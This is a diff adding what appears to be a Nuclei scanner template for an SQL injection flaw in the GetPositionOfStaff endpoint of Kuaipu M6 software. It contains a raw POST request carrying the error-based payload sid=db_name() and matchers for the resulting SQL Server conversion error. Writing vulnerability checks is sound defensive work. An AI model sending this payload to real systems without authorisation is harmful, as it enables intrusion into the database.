@@ -1,0 +1,27 @@
+id: kuaipuM6-GetPositionOfStaff-sql
+
+info:
+  name: 快普M6 GetPositionOfStaff SQL注入漏洞
+  author: kuaipuM6
+  severity: high
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        POST /WebService/StaffService.asmx/GetPositionOfStaff HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        sid=db_name()
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '将 nvarchar 值'
+          - '转换成数据类型 int 时失败'
+        condition: and
+      - type: status
+        status: 
+          - 500
